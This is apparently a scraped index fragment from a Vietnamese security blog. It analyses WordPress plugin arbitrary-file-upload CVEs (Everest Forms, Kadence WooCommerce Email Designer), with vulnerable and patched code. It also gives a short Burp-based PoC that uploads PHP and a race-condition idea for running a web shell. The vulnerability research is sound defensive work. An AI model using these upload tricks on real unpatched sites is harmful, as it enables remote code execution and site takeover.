Analysis"],"collections":null,"content":"References\rArbitrary File Upload WordPress Elementor Website Builder Plugin 3.3.0-3.18.1 Plugin \u003c= 3.3.0-3.18.1 is vulnerable to Arbitrary File Upload ","date":"2025-11-10","objectID":"/vi/posts/2025-11-10-cve-2023-48777/:9:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/vi/posts/2025-11-10-cve-2023-48777/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Everest Forms Plugin.","date":"2025-11-09","objectID":"/vi/posts/2025-11-09-cve-2025-1128/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/vi/posts/2025-11-09-cve-2025-1128/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin Everest Forms ‚Äì Contact Forms, Quiz, Survey, Newsletter \u0026 Payment Form Builder cho WordPress d·ªÖ b·ªã t·∫•n c√¥ng arbitrary file upload, read, and deletion do thi·∫øu file type v√† path validation trong ph∆∞∆°ng th·ª©c format c·ªßa class EVF_Form_Fields_Upload ·ªü t·∫•t c·∫£ c√°c phi√™n b·∫£n ƒë·∫øn v√† bao g·ªìm 3.0.9.4. ƒêi·ªÅu n√†y cho ph√©p unauthenticated attackers c√≥ th·ªÉ upload, read, v√† delete arbitrary files tr√™n server c·ªßa site b·ªã ·∫£nh h∆∞·ªüng, d·∫´n ƒë·∫øn kh·∫£ nƒÉng remote code execution, sensitive information disclosure, ho·∫∑c site takeover. CVE ID: CVE-2025-1128 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 3.0.9.4 Patched Versions: 3.0.9.5 CVSS severity: High (9.8) Required Privilege: Unauthenticated Product: WordPress Everest Forms Plugin ","date":"2025-11-09","objectID":"/vi/posts/2025-11-09-cve-2025-1128/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/vi/posts/2025-11-09-cve-2025-1128/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - Everest Forms: 3.0.9.4 ‚Äì vulnerable 3.0.9.5 ‚Äì patched Diff Tool (diff) ‚Üí Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o. ","date":"2025-11-09","objectID":"/vi/posts/2025-11-09-cve-2025-1128/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/vi/posts/2025-11-09-cve-2025-1128/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause\rL·ªó h·ªïng n√†y do vi·ªác ki·ªÉm tra ki·ªÉu t·ªáp v√† ƒë∆∞·ªùng d·∫´n t·ªáp ch∆∞a ƒë·ªß nghi√™m ng·∫∑t trong h√†m format c·ªßa l·ªõp EVF _Form_Fields_Upload. Ngay c·∫£ khi t·ªáp c√≥ ƒë·ªãnh d·∫°ng kh√¥ng h·ª£p l·ªá, qu√° tr√¨nh t·∫£i l√™n v·∫´n c√≥ th·ªÉ th√†nh c√¥ng, n√™n b·∫±ng c√°ch s·ª≠a m·ªôt v√†i n·ªôi dung trong d·ªØ li·ªáu/giao ti·∫øp g·ª≠i l√™n, c√≥ th·ªÉ n√© ƒë∆∞·ª£c vi·ªác x√°c th·ª±c ph√≠a m√°y ch·ªß. public function format( $field_id, $field_submit, $form_data, $meta_key ) { ... $wp_filetype = wp_check_filetype_and_ext( $file['tmp_path'], $file['name'] ); $ext = empty( $wp_filetype['ext'] ) ? '' : $wp_filetype['ext']; $type = empty( $wp_filetype['type'] ) ? '' : $wp_filetype['type']; $proper_filename = empty( $wp_filetype['proper_filename'] ) ? '' : $wp_filetype['proper_filename']; if ( $proper_filename || ! $ext || ! $type ) { evf()-\u003etask-\u003eerrors[ $form_data['id'] ][ $field_id ] = esc_html__( 'File type is not allowed.', 'everest-forms' ); update_option( 'evf_validation_error', 'yes' ); } ... // upload file handler } H√†m wp_check_filetype_and_ext() s·∫Ω tr·∫£ v·ªÅ $ext v√† $type r·ªóng n·∫øu file upload kh√¥ng h·ª£p l·ªá (kh√¥ng n·∫±m trong whilelist c·ªßa WordPress). Sau khi d√≤ng 8-9 ƒë∆∞·ª£c th·ª±c thi, kh√¥ng c√≥ c∆° ch·∫ø n√†o ƒë·ªÉ d·ª´ng ch∆∞∆°ng tr√¨nh khi·∫øn ch∆∞∆°ng tr√¨nh ti·∫øp t·ª•c th·ª±c thi upload file. B·∫£n v√° ƒë√£ th·ª±c hi·ªán ƒëi·ªÅu n√†y b·∫±ng c√°ch g·ªçi h√†m wp_die() public function format( $field_id, $field_submit, $form_data, $meta_key ) { ... $wp_filetype = wp_check_filetype_and_ext( $file['tmp_path'], $file['name'] ); $ext = empty( $wp_filetype['ext'] ) ? '' : $wp_filetype['ext']; $type = empty( $wp_filetype['type'] ) ? '' : $wp_filetype['type']; $proper_filename = empty( $wp_filetype['proper_filename'] ) ? '' : $wp_filetype['proper_filename']; if ( $proper_filename || ! $ext || ! $type ) { evf()-\u003etask-\u003eerrors[ $form_data['id'] ][ $field_id ] = esc_html__( 'File type is not allowed.', 'everest-forms' ); update_option( 'evf_validation_error', 'yes' ); wp_die( 'File type is not allowed' ); } ... // upload file handler } ","date":"2025-11-09","objectID":"/vi/posts/2025-11-09-cve-2025-1128/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/vi/posts/2025-11-09-cve-2025-1128/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Code Analysis\rpublic function format( $field_id, $field_submit, $form_data, $meta_key ) { // Setup class properties to reuse everywhere. $this-\u003eform_data = (array) $form_data; $this-\u003eform_id = absint( $this-\u003eform_data['id'] ); $this-\u003efield_id = $field_id; $this-\u003efield_data = $this-\u003eform_data['form_fields'][ $this-\u003efield_id ]; $field_label = ! empty( $this-\u003eform_data['form_fields'][ $this-\u003efield_id ]['label'] ) ? $this-\u003eform_data['form_fields'][ $this-\u003efield_id ]['label'] : ''; $input_name = sprintf( 'everest_forms_%d_%s', $this-\u003eform_id, $this-\u003efield_id ); // Make sure json_decode() doesn't fail on newer PHP. try { $raw_files = json_decode( wp_unslash( $_POST[ $input_name ] ), true ); // phpcs:ignore WordPress.Security } catch ( Exception $e ) { evf()-\u003etask-\u003eform_fields[ $this-\u003efield_id ] = $processed; return; } // Make sure we process only submitted files with the expected structure and keys. $files = array_filter( $raw_files, static function ( $file ) { return ( is_array( $file ) || is_object( $file ) \u0026\u0026 count( $file ) === 2 ) \u0026\u0026 ! empty( $file['file'] ) \u0026\u0026 ! empty( $file['name'] ); } ); if ( empty( $files ) ) { evf()-\u003etask-\u003eform_fields[ $this-\u003efield_id ] = $processed; return; } $data = array(); foreach ( $files as $file ) { $file = $this-\u003egenerate_file_info( $file ); $wp_filetype = wp_check_filetype_and_ext( $file['tmp_path'], $file['name'] ); $ext = empty( $wp_filetype['ext'] ) ? '' : $wp_filetype['ext']; $type = empty( $wp_filetype['type'] ) ? '' : $wp_filetype['type']; $proper_filename = empty( $wp_filetype['proper_filename'] ) ? '' : $wp_filetype['proper_filename']; if ( $proper_filename || ! $ext || ! $type ) { evf()-\u003etask-\u003eerrors[ $form_data['id'] ][ $field_id ] = esc_html__( 'File type is not allowed.', 'everest-forms' ); update_option( 'evf_validation_error', 'yes' ); } // Allow third-party integrations. if ( has_filter( 'everest_forms_integration_uploads' ) ) { $file = apply_filters( 'everest_forms_integration_uploads', $file, $this-\u003eform_data ); } if ( $this-\u003eis_media_integrated() ) { $file['path'] = $file['tmp_path']; $file = $this-\u003egenerate_file_attachment( $file ); } elseif ( ! isset( $file['external'] ) \u0026\u0026 file_exists( $file['tmp_path'] ) ) { $this-\u003ecreate_dir( dirname( $file['path'] ) ); @rename( $file['tmp_path'] , $file['path'] ); // phpcs:ignore WordPress.PHP.NoSilencedErrors.Discouraged $this-\u003eset_file_fs_permissions( $file['path'] ); } $data[] = $this-\u003egenerate_file_data( $file ); } ... } Plugin n√†y ƒë∆∞·ª£c t·∫°o ra nh·∫±m m·ª•c ƒë·ªãch t·∫°o form template v√† s·ª≠ d·ª•ng ch√∫ng trong post/page. V√¨ l·ªó h·ªïng li√™n quan ƒë·∫øn vi·ªác upload file, n√™n ta t·∫°o form v·ªõi field File Upload v√† nh√∫ng n√≥ v√†o post T·∫°o form v·ªõi field **File Upload**\rUpload file file b·∫•t k√¨ v√† b·∫Øt l·∫°i b·∫±ng BurpSuite (Vi·ªác upload file c≈©ng d√†nh cho anonymous user khi truy c·∫≠p post/page ƒë∆∞·ª£c nh√∫ng form) B·∫Øt request fileupload b·∫±ng BurpSuite\rƒê·∫∑t break point ƒë·∫øn h√†m format() v√† quan s√°t $input_name trong debugger\rTheo k·∫øt qu·∫£ debug $input_name l√† t√™n tr∆∞·ªùng √°nh x·∫° ƒë·∫øn m·∫£ng ch·ª©a JSON data file v√† name D·ªØ li·ªáu n√†y ƒë∆∞·ª£c decode JSON v√† g√°n cho m·∫£ng $raw_files try { $raw_files = json_decode( wp_unslash( $_POST[ $input_name ] ), true ); // phpcs:ignore WordPress.Security } catch ( Exception $e ) { evf()-\u003etask-\u003eform_fields[ $this-\u003efield_id ] = $processed; return; } $raw_files trong debugger\r$files = array_filter( $raw_files, static function ( $file ) { return ( is_array( $file ) || is_object( $file ) \u0026\u0026 count( $file ) === 2 ) \u0026\u0026 ! empty( $file['file'] ) \u0026\u0026 ! empty( $file['name'] ); } ); Filter n√†y tr·∫£ v·ªÅ d·ªØ li·ªáu g√°n v√†o m·∫£ng $files, ƒë·∫£m b·∫£o ch·ªâ x·ª≠ l√Ω c√°c t·ªáp ƒë∆∞·ª£c g·ª≠i c√≥ c·∫•u tr√∫c v√† kh√≥a mong ƒë·ª£i, n·∫øu l·ªói s·∫Ω tr·∫£ v·ªÅ r·ªóng. $files trong debugger\rDuy·ªát m·∫£ng file, plugin g·ªçi ƒë·∫øn h√†m generate_file_info() ƒë·ªÉ t·∫°o th√¥ng tin t·∫°m cho m·ªói file, sau ƒë√≥ m·ªõi ki·ªÉm tra lo·∫°i file b·∫±ng wp_check_filetype_and_ext(). foreach ( $files as $file ) { $file = $this-\u003egenerate_file_info( $file ); $wp_filetype = wp_check_filetype_and_ext( $file['tmp_path'], $file['name'] ); ... } protected function gen","date":"2025-11-09","objectID":"/vi/posts/2025-11-09-cve-2025-1128/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/vi/posts/2025-11-09-cve-2025-1128/#code-analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"User submits form (file)\"] --\u003e B[\"Browser sends POST to page with form\"]\rB --\u003e C[\"WP hook triggered - listen_task()\"]\rC --\u003e D[\"do_task() calls do_action() with field type\"]\rD --\u003e E[\"everest_forms_process_format_file-upload calls format()\"]\rE --\u003e F[\"generate_file_info() creates tmp_path, name, path\"]\rE --\u003e G[\"wp_check_filetype_and_ext(tmp_path, name)\"]\rG --\u003e H{\"File type check result\"}\rH --\u003e|Valid| I[\"rename(tmp_path ‚Üí path) moves file to uploads\"]\rH --\u003e|Invalid| J[\"Set error but continue execution\"]\rJ --\u003e I\rI --\u003e K[\"File accessible in uploads ‚Üí potential executable upload\"]\rgraph TD\rA[\"User submits form (file)\"] --\u003e B[\"Browser sends POST to page with form\"]\rB --\u003e C[\"WP hook triggered - listen_task()\"]\rC --\u003e D[\"do_task() calls do_action() with field type\"]\rD --\u003e E[\"everest_forms_process_format_file-upload calls format()\"]\rE --\u003e F[\"generate_file_info() creates tmp_path, name, path\"]\rE --\u003e G[\"wp_check_filetype_and_ext(tmp_path, name)\"]\rG --\u003e H{\"File type check result\"}\rH --\u003e|Valid| I[\"rename(tmp_path ‚Üí path) moves file to uploads\"]\rH --\u003e|Invalid| J[\"Set error but continue execution\"]\rJ --\u003e I\rI --\u003e K[\"File accessible in uploads ‚Üí potential executable upload\"]\rgraph TD\rA[\"User submits form (file)\"] --\u003e B[\"Browser sends POST to page with form\"]\rB --\u003e C[\"WP hook triggered - listen_task()\"]\rC --\u003e D[\"do_task() calls do_action() with field type\"]\rD --\u003e E[\"everest_forms_process_format_file-upload calls format()\"]\rE --\u003e F[\"generate_file_info() creates tmp_path, name, path\"]\rE --\u003e G[\"wp_check_filetype_and_ext(tmp_path, name)\"]\rG --\u003e H{\"File type check result\"}\rH --\u003e|Valid| I[\"rename(tmp_path ‚Üí path) moves file to uploads\"]\rH --\u003e|Invalid| J[\"Set error but continue execution\"]\rJ --\u003e I\rI --\u003e K[\"File accessible in uploads ‚Üí potential executable upload\"]\rgraph TD\rA[\"User submits form (file)\"] --\u003e B[\"Browser sends POST to page with form\"]\rB --\u003e C[\"WP hook triggered - listen_task()\"]\rC --\u003e D[\"do_task() calls do_action() with field type\"]\rD --\u003e E[\"everest_forms_process_format_file-upload calls format()\"]\rE --\u003e F[\"generate_file_info() creates tmp_path, name, path\"]\rE --\u003e G[\"wp_check_filetype_and_ext(tmp_path, name)\"]\rG --\u003e H{\"File type check result\"}\rH --\u003e|Valid| I[\"rename(tmp_path ‚Üí path) moves file to uploads\"]\rH --\u003e|Invalid| J[\"Set error but continue execution\"]\rJ --\u003e I\rI --\u003e K[\"File accessible in uploads ‚Üí potential executable upload\"]\r","date":"2025-11-09","objectID":"/vi/posts/2025-11-09-cve-2025-1128/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/vi/posts/2025-11-09-cve-2025-1128/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rT·∫°o file .txt ch·ª©a code php TEXT \u003c?php phpinfo();?\u003e B·∫≠t Burp Intercept v√† b·∫Øt file upload S·ª≠a extension trong name th√†nh .php v√† g·ª≠i request. File upload th√†nh c√¥ng\rTruy c·∫≠p file ƒë√£ upload phpinfo() v·ªõi file upload\r","date":"2025-11-09","objectID":"/vi/posts/2025-11-09-cve-2025-1128/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/vi/posts/2025-11-09-cve-2025-1128/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng trong EVF_Form_Fields_Upload::format() cho ph√©p t·∫£i l√™n, ƒë·ªçc v√† x√≥a t·ªáp t√πy √Ω do thi·∫øu ki·ªÉm tra ki·ªÉu t·ªáp v√† ƒë∆∞·ªùng d·∫´n ƒë√∫ng c√°ch. M·∫∑c d√π plugin c√≥ c·∫£nh b√°o l·ªói khi ph√°t hi·ªán t·ªáp kh√¥ng h·ª£p l·ªá, lu·ªìng x·ª≠ l√Ω kh√¥ng d·ª´ng v√† v·∫´n g·ªçi rename() ƒë·ªÉ di chuy·ªÉn t·ªáp v√†o th∆∞ m·ª•c public ‚Äî d·∫´n ƒë·∫øn kh·∫£ nƒÉng ƒë∆∞a m√£ th·ª±c thi l√™n server (RCE), ti·∫øt l·ªô d·ªØ li·ªáu nh·∫°y c·∫£m ho·∫∑c chi·∫øm quy·ªÅn qu·∫£n tr·ªã site. B·∫£n v√° (‚â• 3.0.9.5) ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch d·ª´ng lu·ªìng khi ph√°t hi·ªán t·ªáp kh√¥ng h·ª£p l·ªá, nh∆∞ng c√°c site ch∆∞a c·∫≠p nh·∫≠t v·∫´n r·∫•t d·ªÖ b·ªã l·ª£i d·ª•ng. ","date":"2025-11-09","objectID":"/vi/posts/2025-11-09-cve-2025-1128/:7:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/vi/posts/2025-11-09-cve-2025-1128/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaway\rThi·∫øu ki·ªÉm tra ch·∫∑t ch·∫Ω ki·ªÉu/ƒëu√¥i file d·∫´n ƒë·∫øn nguy c∆° upload file th·ª±c thi. Ph√°t hi·ªán file kh√¥ng h·ª£p l·ªá nh∆∞ng kh√¥ng d·ª´ng lu·ªìng x·ª≠ l√Ω cho ph√©p k·∫ª t·∫•n c√¥ng bypass. Validation v√¥ nghƒ©a n·∫øu kh√¥ng k√®m h√†nh ƒë·ªông ch·∫∑n (stop/exit/wp_die) tr∆∞·ªõc khi thao t√°c filesystem. C·∫ßn ki·ªÉm tra c·∫£ n·ªôi dung (MIME/content), kh√¥ng ch·ªâ d·ª±a v√†o t√™n/extension do client cung c·∫•p. NgƒÉn th·ª±c thi PHP trong th∆∞ m·ª•c uploads v√† d√πng API upload an to√†n (v√≠ d·ª• wp_handle_upload()). ","date":"2025-11-09","objectID":"/vi/posts/2025-11-09-cve-2025-1128/:8:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/vi/posts/2025-11-09-cve-2025-1128/#key-takeaway"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rArbitrary File Upload WordPress Everest Forms Plugin \u003c= 3.0.9.4 is vulnerable to Arbitrary File Upload ","date":"2025-11-09","objectID":"/vi/posts/2025-11-09-cve-2025-1128/:9:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/vi/posts/2025-11-09-cve-2025-1128/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Kadence WooCommerce Email Designer Plugin.","date":"2025-11-08","objectID":"/vi/posts/2025-11-08-cve-2025-39557/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/vi/posts/2025-11-08-cve-2025-39557/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rL·ªó h·ªïng Arbitrary File Upload trong Ben Ritner - Kadence WP Kadence WooCommerce Email Designer cho ph√©p Upload m·ªôt Web Shell l√™n Web Server. V·∫•n ƒë·ªÅ n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn Kadence WooCommerce Email Designer t·ª´ phi√™n b·∫£n kh√¥ng x√°c ƒë·ªãnh cho ƒë·∫øn 1.5.14. CVE ID: CVE-2025-39557 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 1.5.14 Patched Versions: 1.5.15 CVSS severity: Low (9.1) Required Privilege: Administrator Product: WordPress Kadence WooCommerce Email Designer Plugin ","date":"2025-11-08","objectID":"/vi/posts/2025-11-08-cve-2025-39557/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/vi/posts/2025-11-08-cve-2025-39557/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Kadence WooCommerce Email Designer: 1.5.14 (vulnerable) v√† 1.5.15 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. WooCommerce Plugin ","date":"2025-11-08","objectID":"/vi/posts/2025-11-08-cve-2025-39557/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/vi/posts/2025-11-08-cve-2025-39557/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-11-08","objectID":"/vi/posts/2025-11-08-cve-2025-39557/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/vi/posts/2025-11-08-cve-2025-39557/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff\rstatic private function import_woomail( $wp_customize ) { ... $overrides = array( 'test_form' =\u003e false, 'test_type' =\u003e false, 'mimes' =\u003e array( 'dat' =\u003e 'text/plain', 'json' =\u003e 'text/plain' ) ); $file = wp_handle_upload( $_FILES['kadence-woomail-import-file'], $overrides ); ... } Trong phi√™n b·∫£n l·ªói, h√†m import_woomail() g·ªçi ƒë·∫øn wp_handle_upload() ƒë·ªÉ upload file v√†o th∆∞ m·ª•c upload ch√≠nh th·ª©c c·ªßa WordPress (wp-content/uploads/\u003cyear\u003e/\u003cmonth\u003e/) L·ªói\rTuy nhi√™n, t√πy ch·ªçn test_type =\u003e false khi·∫øn WordPress b·ªè qua vi·ªác ki·ªÉm tra MIME Type d·ª±a tr√™n whitelist h·ª£p l·ªá. ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng upload c√°c t·ªáp nguy hi·ªÉm nh∆∞ web shell .php l√™n m√°y ch·ªß. static private function import_woomail( $wp_customize ) { ... $overrides = array( 'test_form' =\u003e false, 'test_type' =\u003e true, 'mimes' =\u003e array( 'dat' =\u003e 'text/plain', 'json' =\u003e 'text/plain' ) ); $file = wp_handle_upload( $_FILES['kadence-woomail-import-file'], $overrides ); ... } B·∫£n v√° ƒë√£ thay ƒë·ªïi t√πy ch·ªçn 'test_type' =\u003e true n√™n k√≠ch ho·∫°t ki·ªÉm tra MIME theo whitelist, ngƒÉn upload t·ªáp nguy hi·ªÉm nh∆∞ web shell .php. ","date":"2025-11-08","objectID":"/vi/posts/2025-11-08-cve-2025-39557/:3:1","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/vi/posts/2025-11-08-cve-2025-39557/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rstatic private function import_woomail( $wp_customize ) { // Make sure we have a valid nonce. if ( ! wp_verify_nonce( $_REQUEST['kt-woomail-import'], 'kt-woomail-importing' ) ) { return; } // Make sure WordPress upload support is loaded. if ( ! function_exists( 'wp_handle_upload' ) ) { require_once( ABSPATH . 'wp-admin/includes/file.php' ); } // Load the export/import option class. require_once KT_WOOMAIL_PATH . 'includes/class-kadence-woomail-import-option.php'; // Setup global vars. global $wp_customize; global $kt_woomail_import_error; // Setup internal vars. $kt_woomail_import_error = false; $template = 'kadence-woomail-designer'; $overrides = array( 'test_form' =\u003e false, 'test_type' =\u003e false, 'mimes' =\u003e array( 'dat' =\u003e 'text/plain', 'json' =\u003e 'text/plain' ) ); $file = wp_handle_upload( $_FILES['kadence-woomail-import-file'], $overrides ); // Make sure we have an uploaded file. if ( isset( $file['error'] ) ) { $kt_woomail_import_error = $file['error']; return; } if ( ! file_exists( $file['file'] ) ) { $kt_woomail_import_error = __( 'Error importing settings! Please try again.', 'kadence-woocommerce-email-designer' ); return; } // Get the upload data. $raw = file_get_contents( $file['file'] ); $data = json_decode( $raw, true ); // Check for support of older export files. Will remove later. if ( ( 'array' != gettype( $data ) || ! isset( $data['template'] ) ) \u0026\u0026 version_compare( phpversion(), '7.0.0' ) \u003e= 0 ) { $data = @unserialize( base64_decode( $raw ), array( 'allowed_classes' =\u003e false ) ); if ( 'array' != gettype( $data ) || ! isset( $data['template'] ) ) { $data = self::mb_unserialize( $raw ); } } // Remove the uploaded file. unlink( $file['file'] ); ... exit; } H√†m import_woomail() c√≥ nhi·ªám v·ª• x·ª≠ l√Ω t·∫£i l√™n v√† nh·∫≠p d·ªØ li·ªáu c·∫•u h√¨nh cho plugin Kadence WooCommerce Email Designer, c·ª• th·ªÉ: Ki·ªÉm tra nonce ƒë·ªÉ ƒë·∫£m b·∫£o y√™u c·∫ßu h·ª£p l·ªá, tr√°nh CSRF attack: if ( ! wp_verify_nonce( $_REQUEST['kt-woomail-import'], 'kt-woomail-importing' ) ) { return; } Khi search v·ªõi t·ª´ kh√≥a kt-woomail-import trong th∆∞ m·ª•c plugin C√°ch nonce ƒë∆∞·ª£c t·∫°o\rNonce ƒë∆∞·ª£c t·∫°o v·ªõi name l√† kt-woomail-import, t·ª©c nonce ƒë∆∞·ª£c ƒë·∫∑t trong m√£ ngu·ªìn tr·∫£ v·ªÅ khi s·ª≠ d·ª•ng ch·ª©c nƒÉng c·ªßa plugin, ta s·ª≠ d·ª•ng ch·ª©c nƒÉng n√†y v√† l·∫•y nonce C√°ch l·∫•y nonce trong m√£ ngu·ªìn tr·∫£ v·ªÅ\rTh·ª±c hi·ªán upload file b·∫±ng wp_handle_upload() $overrides = array( 'test_form' =\u003e false, 'test_type' =\u003e false, 'mimes' =\u003e array( 'dat' =\u003e 'text/plain', 'json' =\u003e 'text/plain' ) ); $file = wp_handle_upload( $_FILES['kadence-woomail-import-file'], $overrides ); Nh∆∞ ph√¢n t√≠ch ·ªü tr√™n, do tri·ªÉn khai l·ªói n√™n h√†m n√†y ch·∫•p nh·∫≠n upload .php ƒê·ªçc n·ªôi dung file upload, th·ª≠ parse d∆∞·ªõi d·∫°ng JSON. $raw = file_get_contents( $file['file'] ); $data = json_decode( $raw, true ); N·∫øu kh√¥ng ph·∫£i JSON h·ª£p l·ªá ‚Üí th·ª≠ gi·∫£i m√£ base64 r·ªìi unserialize() if ( ( 'array' != gettype( $data ) || ! isset( $data['template'] ) ) \u0026\u0026 version_compare( phpversion(), '7.0.0' ) \u003e= 0 ) { $data = @unserialize( base64_decode( $raw ), array( 'allowed_classes' =\u003e false ) ); if ( 'array' != gettype( $data ) || ! isset( $data['template'] ) ) { $data = self::mb_unserialize( $raw ); } } X√≥a file upload kh·ªèi server unlink( $file['file'] ); Ta c·∫ßn quan t√¢m c√°c ph·∫ßn sau: graph LR;\rA[Upload File] --\u003e B[Read File \u0026 Decode JSON]\rB --\u003e C{IF JSON}\rC --\u003e|True| D[\"unserialize()\"]\rD --\u003e E[\"unlink()\"]\rgraph LR;\rA[Upload File] --\u003e B[Read File \u0026 Decode JSON]\rB --\u003e C{IF JSON}\rC --\u003e|True| D[\"unserialize()\"]\rD --\u003e E[\"unlink()\"]\rgraph LR;\rA[Upload File] --\u003e B[Read File \u0026 Decode JSON]\rB --\u003e C{IF JSON}\rC --\u003e|True| D[\"unserialize()\"]\rD --\u003e E[\"unlink()\"]\rgraph LR;\rA[Upload File] --\u003e B[Read File \u0026 Decode JSON]\rB --\u003e C{IF JSON}\rC --\u003e|True| D[\"unserialize()\"]\rD --\u003e E[\"unlink()\"]\rFile b·ªã x√≥a ngay sau khi upload, n√™n kh√¥ng th·ªÉ truy c·∫≠p theo c√°ch th√¥ng th∆∞·ªùng. T·∫≠n d·ª•ng kho·∫£ng th·ªùi gian gi·ªØa Upload File v√† unlink() ƒë·ªÉ g·ªçi file v·ª´a upload trong kho·∫£ng th·ªùi gian ƒë√≥ nh·∫±m th·ª±c thi web shell. Ta s·ª≠ d·ª•ng k·ªπ thu·∫≠t File Upload + Race Condition static public function import_export_reques","date":"2025-11-08","objectID":"/vi/posts/2025-11-08-cve-2025-39557/:3:2","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/vi/posts/2025-11-08-cve-2025-39557/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"Upload file via HTTP POST (kt-woomail-import + kadence-woomail-import-file)\"] --\u003e B[\"wp_handle_upload($_FILES['kadence-woomail-import-file'], $overrides) called\"]\rB --\u003e C[\"File written to /wp-content/uploads/year/month/filename\"]\rC --\u003e D[\"file_exists($file['file']) ‚Üí file_get_contents($file['file'])\"]\rD --\u003e E[\"json_decode($raw) ‚Äî attempt parse as JSON\"]\rE --\u003e F[\"If JSON invalid ‚Üí base64_decode($raw) ‚Üí unserialize()/mb_unserialize()\"]\rF --\u003e G[\"Process/import template data\"]\rG --\u003e H[\"unlink($file['file']) ‚Äî delete uploaded file\"]\rH --\u003e I[\"File removed from filesystem\"]\rgraph TD\rA[\"Upload file via HTTP POST (kt-woomail-import + kadence-woomail-import-file)\"] --\u003e B[\"wp_handle_upload($_FILES['kadence-woomail-import-file'], $overrides) called\"]\rB --\u003e C[\"File written to /wp-content/uploads/year/month/filename\"]\rC --\u003e D[\"file_exists($file['file']) ‚Üí file_get_contents($file['file'])\"]\rD --\u003e E[\"json_decode($raw) ‚Äî attempt parse as JSON\"]\rE --\u003e F[\"If JSON invalid ‚Üí base64_decode($raw) ‚Üí unserialize()/mb_unserialize()\"]\rF --\u003e G[\"Process/import template data\"]\rG --\u003e H[\"unlink($file['file']) ‚Äî delete uploaded file\"]\rH --\u003e I[\"File removed from filesystem\"]\rgraph TD\rA[\"Upload file via HTTP POST (kt-woomail-import + kadence-woomail-import-file)\"] --\u003e B[\"wp_handle_upload($_FILES['kadence-woomail-import-file'], $overrides) called\"]\rB --\u003e C[\"File written to /wp-content/uploads/year/month/filename\"]\rC --\u003e D[\"file_exists($file['file']) ‚Üí file_get_contents($file['file'])\"]\rD --\u003e E[\"json_decode($raw) ‚Äî attempt parse as JSON\"]\rE --\u003e F[\"If JSON invalid ‚Üí base64_decode($raw) ‚Üí unserialize()/mb_unserialize()\"]\rF --\u003e G[\"Process/import template data\"]\rG --\u003e H[\"unlink($file['file']) ‚Äî delete uploaded file\"]\rH --\u003e I[\"File removed from filesystem\"]\rgraph TD\rA[\"Upload file via HTTP POST (kt-woomail-import + kadence-woomail-import-file)\"] --\u003e B[\"wp_handle_upload($_FILES['kadence-woomail-import-file'], $overrides) called\"]\rB --\u003e C[\"File written to /wp-content/uploads/year/month/filename\"]\rC --\u003e D[\"file_exists($file['file']) ‚Üí file_get_contents($file['file'])\"]\rD --\u003e E[\"json_decode($raw) ‚Äî attempt parse as JSON\"]\rE --\u003e F[\"If JSON invalid ‚Üí base64_decode($raw) ‚Üí unserialize()/mb_unserialize()\"]\rF 